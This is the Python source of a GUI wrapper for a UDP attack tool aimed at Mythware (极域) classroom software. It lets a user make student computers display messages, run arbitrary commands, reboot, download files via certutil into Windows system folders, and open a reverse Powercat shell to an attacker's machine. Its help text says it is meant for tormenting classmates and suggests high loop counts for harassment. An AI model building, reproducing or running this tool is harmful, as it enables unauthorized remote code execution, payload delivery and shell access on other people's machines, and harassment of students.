#本文件使用CustomTkinter进行GUI开发
import sys
import threading #多线程库
import customtkinter as ctk
import Jiyu_udp_attack as Jiyu #极域UDP攻击
from shell_debug import CommandLineWidget as clw #命令行窗口
import hashlib as Hash #哈希加密
import time #计时
import os
import subprocess

#定义一个字典,存储上次命令
latest_command = {"ip": "", "c": "", "msg": "", "range": "", "url": "", "file_storage": ""}

'''资源路径处理函数，用于打包后访问文件'''
def resource_path(relative_path):
    """获取资源的绝对路径，兼容开发环境和打包后的环境"""
    try:
        # PyInstaller 创建临时文件夹，将路径存储在 _MEIPASS 中
        base_path = sys._MEIPASS
    except Exception:
        # 未打包时，使用当前工作目录
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_app_dir():
    """返回当前应用程序所在目录（兼容打包和开发环境）"""
    if getattr(sys, 'frozen', False):
        # 打包后，sys.executable 是 exe 的路径
        return os.path.dirname(sys.executable)
    else:
        # 开发环境，__file__ 是当前脚本路径
        return os.path.dirname(__file__)


'''这里是实现禁止多线程的部分(点了一个按钮在完成之前不能再点一个)'''
# 任务运行标志
task_running = False
task_lock = threading.Lock()

short_password = '47528fde188a75581be3a3242354512f' #短期密码

have_error = False

ip = "N"

#ip查询功能 - 读取ip_address.txt
try:
    ip_file_path = resource_path("ip_address.txt")
    with open(ip_file_path, mode="r", encoding="utf-8") as ip_list:
        ip_lists = ip_list.readlines()
except FileNotFoundError:
    have_error = True
    ip_lists = []  # 空列表，避免后续使用出错
except Exception as e:
    have_error = True
    ip_lists = []
    print(f"读取文件时发生错误: {e}")

# 需要禁用的按钮列表（在创建按钮后添加）
action_buttons = []

def disable_buttons():
    """禁用所有操作按钮"""
    for btn in action_buttons:
        btn.configure(state="disabled")

def enable_buttons():
    """启用所有操作按钮"""
    global task_running
    for btn in action_buttons:
        btn.configure(state="normal")
    task_running = False

def start_task(task_func):
    """启动任务，如果已有任务则提示"""
    global task_running
    if task_running:
        print("请先完成当前进程")
        return False
    
    task_running = True
    disable_buttons()
    
    def wrapped_task():
        try:
            task_func()
        except Exception as e:
            print(f"任务出错: {e}")
        finally:
            # 任务完成后恢复按钮（必须在主线程中执行）
            app.after(0, enable_buttons)
    
    thread = threading.Thread(target=wrapped_task, daemon=True)
    thread.start()
    return True



app = ctk.CTk() #主程序

#定义窗口大小
window_width = 1000
window_height = 562.5
#获取屏幕尺寸
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
#获取屏幕中心
x = (screen_width - window_width) // 2
y = (screen_height - window_height) // 2

#参数设置
def settings():
    def Settings():
        print("\n-------------------------------------------------------")
        print("请设置循环时每条消息/指令的发送间隔(推荐10秒),你的上一次设置: "+str(Jiyu.args.t)+"秒")
        Jiyu.args.t = int(input())
        print("请设置发送端口(一般无需修改，填4705即可，乱改可能会导致消息无法发送!),你的上一次设置: "+str(Jiyu.args.p)+" 端口")
        Jiyu.args.p = int(input())
        print("需要设置IP默认填充吗?(即自动填充ip地址,不询问;若需要,请输入IP地址,不需要,请输入N)")
        global ip
        ip = input()
        print("设置完成,新的设置已经生效:")
        print("循环时间间隔: "+str(Jiyu.args.t)+"秒")
        print("发送端口: "+str(Jiyu.args.p)+" 端口")
        if ip != "N":
            print("默认Ip: "+ip)
        print("-------------------------------------------------------")
        print(">>> ")
    # 使用 start_task 启动任务
    start_task(Settings)

#本机ip查询函数
def ipsearch():    
    def task():
        try:
            # 模拟命令行参数 -e g
            Jiyu.args.e = "g"
            # 运行Jiyu模块
            try:
                Jiyu.run_from_cmd()
            except SystemExit:
                pass
        except:
            pass
        print(">>> ")
    start_task(task)

#ip发送消息函数
def send_message():
    def task():
        Jiyu.args.c = None #先清除command属性，防止误发送
        Jiyu.args.msg = None #先清除msg属性，防止误发送
        print("注意:该功能现有一个无法解决的bug:当发送第二条文字时,如果比第一条短,则会出现字符拼接错误的情况")
        print('如:第一次输入:msg, 第二次输入:z,则消息会被错误的发送为: "z"g"')
        if len(latest_command["msg"]) != 0:
            print("发现上次的命令!是否需要填充?(填充请输入T)")
            answer = input()
            if answer == "T":
                global ip_addr, msg, Range
                Jiyu.args.ip = latest_command["ip"]
                Jiyu.args.msg = latest_command["msg"]
                Jiyu.args.l = latest_command["range"]
                while True:
                    print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的消息是:  "+msg+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
                    print("(a).修改ip地址\n(b).修改消息内容\n(c).修改循环次数\n(T).确定\n(F).取消")
                    answer = input()
                    time.sleep(0.05)#防止输出乱序
                    if answer == "a":
                        print("请输入要修改的ip地址: ")
                        ip_addr = input()
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
                    elif answer == "b":
                        print("请输入要修改的消息: ")
                        msg = ''
                        Jiyu.args.msg = ''
                        msg = '"'+input()+'"'
                        Jiyu.args.msg = msg
                        time.sleep(0.05)#防止输出乱序
                    elif answer == "c":
                        print("请输入要循环的次数: ")
                        Range = 1
                        Range = int(input())
                        Jiyu.args.l = Range
                        time.sleep(0.05)#防止输出乱序
                    elif answer == "T":
                        print("已确认")
                        break
                    else:
                        Jiyu.args.ip = latest_command["ip"]
                        Jiyu.args.msg = latest_command["msg"]
                        Jiyu.args.l = latest_command["range"]
                        break
            else:
                if ip == "N":
                    print("\n\n请输入目标ip地址:")
                    ip_addr = input()
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                else:
                    ip_addr = ip
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                print("请输入要发送的内容:")
                msg = '"'+input()+'"'
                Jiyu.args.msg = msg
                time.sleep(0.05)#防止输出乱序
                print("你需要循环多少次(不需要请填1)")
                Range = 1
                Range = int(input())
                Jiyu.args.l = Range
                time.sleep(0.05)#防止输出乱序
        else:
            if ip == "N":
                print("\n\n请输入目标ip地址:")
                ip_addr = input()
                Jiyu.args.ip = ip_addr
                time.sleep(0.05)#防止输出乱序
            else:
                ip_addr = ip
                Jiyu.args.ip = ip_addr
                time.sleep(0.05)#防止输出乱序
            print("请输入要发送的内容:")
            msg = '"'+input()+'"'
            Jiyu.args.msg = msg
            time.sleep(0.05)#防止输出乱序
            print("你需要循环多少次(不需要请填1)")
            Range = 1
            Range = int(input())
            Jiyu.args.l = Range
            time.sleep(0.05)#防止输出乱序
        print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的消息是:  "+msg+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
        print("是否正确？(正确请输入T)")
        answer = input()
        if answer == "T":
            latest_command["ip"] = Jiyu.args.ip
            latest_command["msg"] = Jiyu.args.msg
            latest_command["range"] = Jiyu.args.l
            Jiyu.args.e = None #清除命令行指令,防止重复查询ip(即Jiyu.args.e = "g"的情况)
            Jiyu.run_from_cmd()
            time.sleep(0.05)#防止输出乱序
            app.cli._append_output(">>> ")
        else:
            print("已取消发送")
            Jiyu.args.c = None #清除command属性，防止误发送
            Jiyu.args.msg = None #清除msg属性，防止误发送
            time.sleep(0.05)#确保">>>"在输出的后面而不是前面
            app.cli._append_output(">>> ")
    start_task(task)

#ip发送指令函数
def send_command():
    def task():
        Jiyu.args.c = None #先清除command属性，防止误发送
        Jiyu.args.msg = None #先清除msg属性，防止误发送
        password = input("此为开发者专用功能,请输入密码:")
        password = password.encode()#字符化字符串(用于加密为hash md5)
        password = Hash.md5(password).hexdigest()
        truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688' #长期密码
        if truly_password == password or short_password == password:
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            Jiyu.args.c = None #先清除command属性，防止误发送
            Jiyu.args.msg = None #先清除msg属性，防止误发送
            if len(latest_command["c"]) != 0:
                print("发现上次的命令!是否需要填充?(填充请输入T)")
                answer = input()
                if answer == "T":
                    global ip_addr, cmd, Range
                    Jiyu.args.ip = latest_command["ip"]
                    Jiyu.args.c = latest_command["c"]
                    Jiyu.args.l = latest_command["range"]
                    while True:
                        print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的命令是:  "+Jiyu.args.c+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
                        print("(a).修改ip地址\n(b).修改命令内容\n(c).修改循环次数\n(T).确定\n(F).取消")
                        answer = input()
                        time.sleep(0.05)#防止输出乱序
                        if answer == "a":
                            print("请输入要修改的ip地址: ")
                            ip_addr = input()
                            Jiyu.args.ip = ip_addr
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "b":
                            print("请输入要修改的命令: ")
                            cmd = '"'+input()+'"'
                            Jiyu.args.c = cmd
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "c":
                            print("请输入要循环的次数: ")
                            Range = 1
                            Range = int(input())
                            Jiyu.args.l = Range
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "T":
                            print("已确认")
                            break
                        else:
                            Jiyu.args.ip = latest_command["ip"]
                            Jiyu.args.c = latest_command["c"]
                            Jiyu.args.l = latest_command["range"]
                            break
                else:
                    if ip == "N":
                        print("\n\n请输入目标ip地址:")
                        ip_addr = input()
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
                    else:
                        ip_addr = ip
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
                    print("请输入要执行的命令:")
                    cmd = '"'+input()+'"'
                    Jiyu.args.c = cmd
                    time.sleep(0.05)#防止输出乱序
                    print("你需要循环多少次(不需要请填1)")
                    Range = 1
                    Range = int(input())
                    Jiyu.args.l = Range
                    time.sleep(0.05)#防止输出乱序
            else:
                if ip == "N":
                    print("\n\n请输入目标ip地址:")
                    ip_addr = input()
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                else:
                    ip_addr = ip
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                print("请输入要执行的命令:")
                cmd = '"'+input()+'"'
                Jiyu.args.c = cmd
                time.sleep(0.05)#防止输出乱序
                print("你需要循环多少次(不需要请填1)")
                Range = 1
                Range = int(input())
                Jiyu.args.l = Range
                time.sleep(0.05)#防止输出乱序
            print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的命令是:  "+Jiyu.args.c+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
            print("是否正确？(正确请输入T)")
            answer = input()
            if answer == "T":
                latest_command["ip"] = Jiyu.args.ip
                latest_command["c"] = Jiyu.args.c
                latest_command["range"] = Jiyu.args.l
                Jiyu.args.e = None #清除命令行指令,防止重复查询ip(即Jiyu.args.e = "g"的情况)
                Jiyu.run_from_cmd()
                time.sleep(0.05)#防止输出乱序
                app.cli._append_output(">>> ")
            else:
                print("已取消发送")
                Jiyu.args.c = None #清除command属性，防止误发送
                Jiyu.args.msg = None #清除msg属性，防止误发送
                time.sleep(0.05)#防止输出乱序
                app.cli._append_output(">>> ")
        else:
            print("密码错误")
            time.sleep(0.05)#防止输出乱序
            app.cli._append_output(">>> ")
    start_task(task)

#特定ip重启参数
def reboot():
    def task():
        Jiyu.args.c = None #先清除command属性，防止误发送
        Jiyu.args.msg = None #先清除msg属性，防止误发送
        password = input("此为开发者专用功能,请输入密码:")
        password = password.encode()#字符化字符串(用于加密为hash md5)
        password = Hash.md5(password).hexdigest()
        truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
        if truly_password == password or short_password == password:
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            if len(latest_command["ip"]) != 0:
                print("发现上次的命令!是否需要填充?(填充请输入T)")
                answer = input()
                if answer == "T":
                    global ip_addr
                    Jiyu.args.ip = latest_command["ip"]
                    while True:
                        print("你将向ip地址为 "+ip_addr+" 的主机发送重启指令")
                        print("(a).修改ip地址\n(T).确定\n(F).取消")
                        answer = input()
                        time.sleep(0.05)#防止输出乱序
                        if answer == "a":
                            print("请输入要修改的ip地址: ")
                            ip_addr = input()
                            Jiyu.args.ip = ip_addr
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "T":
                            print("已确认")
                            break
                        else:
                            Jiyu.args.ip = latest_command["ip"]
                            break
                else:
                    if ip == "N":
                        print("\n\n请输入目标ip地址:")
                        ip_addr = input()
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
                    else:
                        ip_addr = ip
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
            else:
                if ip == "N":
                    print("\n\n请输入目标ip地址:")
                    ip_addr = input()
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                else:
                    ip_addr = ip
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
            answer = input("你将向ip地址为 "+ip_addr+" 的主机发送重启指令,确认请输入T\n")
            if answer == "T":
                answer = "F"
                time.sleep(0.05)#防止输出乱序
                answer = input("[再次确认]你将向ip地址为 "+ip_addr+" 的主机发送重启指令,确认请输入T\n")
                if answer == "T":
                    latest_command["ip"] = Jiyu.args.ip
                    print("好的,将发送重启指令!")
                    Jiyu.args.e = "r"
                    Jiyu.run_from_cmd()
                    time.sleep(0.05)#防止输出乱序
                    app.cli._append_output(">>> ")
                else:
                    print("已取消发送")
                    time.sleep(0.05)#防止输出乱序
                    app.cli._append_output(">>> ")
            else:
                print("已取消发送")
                time.sleep(0.05)#防止输出乱序
                app.cli._append_output(">>> ")
        else:
            print("密码错误")
            time.sleep(0.05)#防止输出乱序
            app.cli._append_output(">>> ")
    start_task(task)

#文件下载功能
def file_download():
    def task():
        Jiyu.args.c = None #先清除command属性，防止误发送
        Jiyu.args.msg = None #先清除msg属性，防止误发送
        password = input("此为开发者专用功能,请输入密码:")
        password = password.encode()#字符化字符串(用于加密为hash md5)
        password = Hash.md5(password).hexdigest()
        truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
        if truly_password == password or short_password == password:
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            app.cli._clear_output()#清空输入
            print("注意:该功能现有一个无法解决的bug:文件下载功能可能会失效")
            if len(latest_command["url"]) != 0:
                print("发现上次的命令!是否需要填充?(填充请输入T)")
                answer = input()
                if answer == "T":
                    global ip_addr,url_backup
                    Jiyu.args.ip = latest_command["ip"]
                    url = latest_command["url"]
                    storage = latest_command["storage"]
                    url = '"certutil -urlcache -split -f '+url
                    url = url+' '+storage+'"'
                    Jiyu.args.c = url
                    while True:
                        print("你的目标ip地址是:    "+ip_addr+",\n发送的文件链接是:  "+url_backup+",\n文件的保存地址是:  "+storage+",\n发送端口:  "+str(Jiyu.args.p))
                        print("(a).修改ip地址\n(b).修改下载链接\n(c).修改保存位置\n(T).确定\n(F).取消")
                        answer = input()
                        time.sleep(0.05)#防止输出乱序
                        if answer == "a":
                            print("请输入要修改的ip地址: ")
                            ip_addr = input()
                            Jiyu.args.ip = ip_addr
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "b":
                            print("请输入要修改的下载链接: ")
                            url = input()
                            url_backup = url
                            url = '"certutil -urlcache -split -f '+url
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "c":
                            print("请输入要修改的保存位置: (含文件名)")
                            storage = input()
                            url = url+' '+storage+'"'
                            Jiyu.args.c = url
                            time.sleep(0.05)#防止输出乱序
                        elif answer == "T":
                            print("已确认")
                            break
                        else:
                            Jiyu.args.ip = latest_command["ip"]
                            url = latest_command["url"]
                            storage = latest_command["storage"]
                            url = '"certutil -urlcache -split -f '+url
                            url = url+' '+storage+'"'
                            Jiyu.args.c = url
                            break
                else:
                    if ip == "N":
                        print("\n\n请输入目标ip地址:")
                        ip_addr = input()
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
                    else:
                        ip_addr = ip
                        Jiyu.args.ip = ip_addr
                        time.sleep(0.05)#防止输出乱序
                    print("请输入文件的链接:")
                    url = input()
                    url_backup = url
                    url = '"certutil -urlcache -split -f '+url
                    time.sleep(0.05)#防止输出乱序
                    print("请输入文件保存位置(含文件名):")
                    storage = input()
                    url = url+' '+storage+'"'
                    Jiyu.args.c = url
                    time.sleep(0.05)#防止输出乱序
            else:
                if ip == "N":
                    print("\n\n请输入目标ip地址:")
                    ip_addr = input()
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                else:
                    ip_addr = ip
                    Jiyu.args.ip = ip_addr
                    time.sleep(0.05)#防止输出乱序
                print("请输入文件的链接:")
                url = input()
                url_backup = url
                url = '"certutil -urlcache -split -f '+url
                time.sleep(0.05)#防止输出乱序
                print("请输入文件保存位置(含文件名):")
                storage = input()
                url = url+' '+storage+'"'
                Jiyu.args.c = url
                time.sleep(0.05)#防止输出乱序
            print("\n------------------------------------")
            print("你的目标ip地址是:    "+ip_addr+",\n发送的文件链接是:  "+url_backup+",\n文件的保存地址是:  "+storage+",\n发送端口:  "+str(Jiyu.args.p))
            print("------------------------------------\n")
            print("是否正确？(正确请输入T)")
            answer = input()
            if answer == "T":
                latest_command["ip"] = Jiyu.args.ip
                latest_command["url"] = url
                latest_command["storage"] = storage
                Jiyu.args.e = None
                Jiyu.run_from_cmd()
                Jiyu.args.e = None #清除命令行指令
                Jiyu.args.c = None
                Jiyu.args.msg = None
                time.sleep(0.05)#防止输出乱序
                app.cli._append_output(">>> ")
            else:
                print("已取消发送")
                time.sleep(0.05)#防止输出乱序
                app.cli._append_output(">>> ")
        else:
            print("密码错误")
            time.sleep(0.05)#防止输出乱序
            app.cli._append_output(">>> ")
    start_task(task)

#帮助文本
def help_list():
    app.cli._clear_output()
    print("\n本软件由mc_118ruken制作")
    print("\n项目灵感来源:imengyu的JiYuTrainer项目,项目地址:https://github.com/imengyu/JiYuTrainer")
    print("              ht0Ruial的Jiyu_udp_attack项目,项目地址:https://github.com/ht0Ruial/Jiyu_udp_attack")
    print("在此感谢两位大佬的付出!")
    print("软件的UI部分使用DeepSeek制作(我学Python的时候没学做UI),所以可能会有各种各样的BUG")
    print("写这个软件只是方便我的朋友使用(我自己用命令行是完全够用的),比较潦草,也只是即兴写的")
    print("当然还有另一个原因是方便在信息课上折磨我的同学:)")
    print("好了我就说这么多,感谢你能看到这里")
    print("\n-----------------------------------------------\n帮助:")


    print("\n\n1.UI界面的使用")
    print("如您所见,软件的左侧是命令行窗口,右侧是功能按钮,下方有输入框")
    print("需要注意的是,输入框的右侧是'清除'按钮而非'发送'按钮(Deepseek写的,懒得改了)")
    print("命令行窗口是为功能按钮显示信息的,所有的输入提示都在这里,您的输入也将在这里出现")
    print("如果需要输入,请点击输入框,输入所需要的文本,然后按下回车(Enter)键")
    print("当点击左侧的功能按钮时,所有按钮会被禁用,以防输入冲突")
    print("这些功能按钮将分别在下面介绍")


    print("\n\n2.功能按钮详解")

    print("\n2-1.向特定Ip发送一条消息")
    print("输入要求:")
    print("(1).ip地址:形如192.168.110.1的地址,这个请自己找,这里不再赘述ip地址的相关知识")
    print("(2).要发送的内容:你想说的消息,比如'你好!'(输入时不要带引号)")
    print("(3).循环次数:将循环发送几次这条消息,一般不会重复发送,填1即可(想骚扰别人的可以填个较大的数字)")
    print("(4).确认发送:最后确认发送参数,可以上面输出的参数.如果正确,请输入'T'(不能输入't');如果错误,可以输入任意文本来停止发送")

    print("\n2-2.让特定Ip执行一条指令")
    print("输入要求:")
    print("(0).密码:为了防止恶意用户滥用部分影响较大的功能,需要输入开发者密码,请找开发人员获取")
    print("(1).ip地址:形如192.168.110.1的地址,这个请自己找,这里不再赘述ip地址的相关知识")
    print("(2).要执行的指令:你想让对方执行的指令,比如:\n  calc.exe        打开计算器\n  notepad.exe 打开记事本\n  regedit.exe   打开注册表编辑器\n等指令,当然也可以运行像是'start https://bilibili.com'(打开哔哩哔哩)等cmd命令")
    print("(3).循环次数:将循环执行几次这条指令,一般不会重复发送,填1即可(想骚扰别人的可以填个较大的数字)")
    print("(4).确认发送:最后确认发送参数,可以上面输出的参数.如果正确,请输入'T'(不能输入't');如果错误,可以输入任意文本来停止发送")

    print("\n2-3查询本机Ip+极域学生端所使用的端口")
    print("这个功能按钮将直接输出你的Ip和极域的端口,一般输出的第一个端口就是极域的主通信端口(后面会提到)")
    print("但ip查询功能可能会查错,所以更推荐打开cmd使用ipconfig")

    print("\n2-4.让特定Ip重启")
    print("输入要求:")
    print("(0).密码:为了防止恶意用户滥用部分影响较大的功能,需要输入开发者密码,请找开发人员获取")
    print("(1).ip地址:形如192.168.110.1的地址,这个请自己找,这里不再赘述ip地址的相关知识")
    print("(2).确认发送:确认发送重启命令请输入'T'(不能输入't')确定或输入任意文本来停止发送")
    print("(3).再次确认发送:最后确认发送重启命令请输入'T'(不能输入't')确定或输入任意文本来停止发送")

    print("\n2-5.让特定ip下载文件")
    print("输入要求:")
    print("(0).密码:为了防止恶意用户滥用部分影响较大的功能,需要输入开发者密码,请找开发人员获取")
    print("(1).ip地址:形如192.168.110.1的地址,这个请自己找,这里不再赘述ip地址的相关知识")
    print("(2).文件链接:文件的http链接,比如https://baidu.com/robots.txt(百度服务器上的一个文件)")
    print("(3).文件存储位置:下载的文件的存储位置,通常放在 C:\\Windows或C:\\Windows\\System32 文件夹,方便使用2-2.让特定Ip执行一条指令功能调用\n注意:存储的时候记得在后面加上文件名和拓展名,即C:\\Windows\\文件名 或C:\\Windows\\System32\\文件名,比如C:\\Windows\\robots.txt")
    print("(4).确认发送:最后确认发送参数,可以上面输出的参数.如果正确,请输入'T'(不能输入't');如果错误,可以输入任意文本来停止发送")
    print("拓展:使用功能2-2打开文件:")
    print("第(0)(1)步要求同上,第(2)步分情况输入:\n如果是.exe文件,则直接输入 文件名.exe打开\n如果是.txt(文本文档)文件,则输入notepad.exe_文件名.txt打开(下划线换成空格)\n其他的别问我,我不知道,后面的输入您随意")

    print("\n2-6.参数设置")
    print("输入要求:")
    print("(1).循环时间间隔:循环发送一次指令/消息的时间间隔,不改可以看输出的内容,你的上一次设定就是默认值")
    print("(2).端口:极域通讯端口,一般4705,不知道的别改")

    print("\n2-7.帮助")
    print("显示这条帮助")

    print("\n2-8.ip查询")
    print("查询一些已经知道的ip地址")
    print("注意:需要在程序同一目录下放一个ip_address.txt文件,否则无法读取!")

    print("\n2-9.反弹Shell")
    print("通过Powercat指令反弹shell,获得对方的powershell权限")
    print("输入要求:")
    print("(0).密码:为了防止恶意用户滥用部分影响较大的功能,需要输入开发者密码(临时密码不可用)")
    print("(1).ip地址(被攻击机):形如192.168.110.1的地址,这个请自己找,这里不再赘述ip地址的相关知识")
    print("(2).本机的服务器ip:攻击机上的一个服务器,请执行文件夹中的test.exe(必须使用8000端口)")
    print("之后,将弹出一个powershell窗口(若起始位置是C:\\Windows\\System32文件夹,说明反弹Shell成功)")
    print("注意:此窗口不支持中文")
    

    print("\n\n3.命令行指令")
    print("命令行有如下指令:")
    print("clear     清空命令行输出,作用与'清空'按钮相同(没用就按按钮)")
    print("help      调出命令行版本的帮助列表(不与此帮助相同)")
    print("env       调试用指令,显示当前环境(打包环境/开发环境)")
    print("size      调试用指令,显示命令行窗口的大小")
    print("test      测试命令行的输出功能")
    print("inputtest 测试命令行的输入功能")
    print("history   显示输入过的命令(清空输出后这里也会清空)")
    print("exit      关闭当前窗口")
    print("args      调试用指令,显示Jiyu所支持的命令行参数及其内容")

    print(">>> ")

#ip查询功能
def ip_list_search():
    if have_error:
        print("错误: ip_address.txt 文件不存在，无法查询IP列表。")
        print(">>> ")
        return
    app.cli._clear_output()
    print("\n")
    for i in ip_lists:
        i = i.replace("\n", "")
        print(i)
    print(">>> ")

#反弹Shell功能
def GET_Shell():
    def task():
        Jiyu.args.c = None
        Jiyu.args.msg = None
        password = input("此为开发者专用功能,请输入密码:")
        password = password.encode()
        password = Hash.md5(password).hexdigest()
        truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
        if truly_password == password:
            app.cli._clear_output()
            for _ in range(5):
                app.cli._clear_output()
            
            if ip == "N":
                print("\n\n请输入目标ip地址:")
                ip_addr = input().strip()
                time.sleep(0.05)
            else:
                ip_addr = ip
                time.sleep(0.05)
            
            print("请确认文件分发服务器是否运行!")
            print("请输入文件服务器运行ip!")
            server_ip = input().strip()
            time.sleep(0.05)
            
            base_dir = get_app_dir()
            if getattr(sys, 'frozen', False):
                # 打包环境：直接运行 exe
                script_path = os.path.join(base_dir, 'Jiyu_udp_attack.exe')
                cmd = [script_path, '-ip', ip_addr, '-lip', server_ip, '-e', 'nc']
            else:
                # 开发环境：用 python 运行脚本
                script_path = os.path.join(base_dir, 'Jiyu_udp_attack.py')
                cmd = ['python', script_path, '-ip', ip_addr, '-lip', server_ip, '-e', 'nc']
            
            print("\n------------------------------------")
            print("你的目标ip地址是:    "+ip_addr)
            print("准备在新窗口中运行攻击脚本...")
            print("------------------------------------\n")
            
            # 启动新进程（独立窗口）
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
            
            print("攻击脚本已在独立窗口中运行，请关注该窗口。")
            print(">>> ")
        else:
            print("密码错误")
            time.sleep(0.05)
            app.cli._append_output(">>> ")
    start_task(task)


#窗口设置
app.title("极域发送消息") #窗口标题
app.geometry(f"{window_width}x{window_height}+{x}+{y}") #设置窗口大小1000x562.5(16:9),同时显示在屏幕中心
app.resizable(False, False) #长、宽不可调
ctk.set_appearance_mode("Dark") #窗口主题
ctk.set_default_color_theme("green") #窗口主题色

#创建文本对象
title = ctk.CTkLabel(app, text="极域udp攻击", font=("Microsoft YaHei UI Bold", 36)) #标题
title.place(x=400, y=10)

msg_btn = ctk.CTkButton(app, text="向特定Ip发送一条消息", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=send_message)
msg_btn.place(x=800, y=100)
action_buttons.append(msg_btn)

command_btn = ctk.CTkButton(app, text="让特定Ip执行一条指令", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=send_command)
command_btn.place(x=800, y=150)
action_buttons.append(command_btn)

ipsearch_btn = ctk.CTkButton(app, text="查询本机Ip+\n极域学生端所使用的端口", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=ipsearch)
ipsearch_btn.place(x=800, y=200)
action_buttons.append(ipsearch_btn)

reboot_btn = ctk.CTkButton(app, text="让特定Ip重启", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=reboot)
reboot_btn.place(x=800, y=270)
action_buttons.append(reboot_btn)

download_btn = ctk.CTkButton(app, text="让特定ip下载文件", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=file_download)
download_btn.place(x=800, y=320)
action_buttons.append(download_btn)

settings_btn = ctk.CTkButton(app, text="参数设置", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=settings)
settings_btn.place(x=800, y=370)
action_buttons.append(settings_btn)

help_btn = ctk.CTkButton(app, text="帮助(初次使用必看)", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=help_list)
help_btn.place(x=800, y=420)
action_buttons.append(help_btn)

ip_list_btn = ctk.CTkButton(app, text="ip查询", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=ip_list_search)
ip_list_btn.place(x=800, y=470)
action_buttons.append(ip_list_btn)

Shell_btn = ctk.CTkButton(app, text="反弹Shell", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=GET_Shell)
Shell_btn.place(x=800, y=520)
action_buttons.append(Shell_btn)


#嵌入命令行窗口
app.cli = clw(app, width=800, height=450)
app.cli.place(x=0, y=50)

#输出Jiyu_udp_attack.py支持的参数
#print(Jiyu.args)

if have_error:
    print("错误!未找到ip_address.txt文件!请确保ip_address.txt和本程序在同一个目录下!")
    print(">>> ")

#启动窗口
app.mainloop()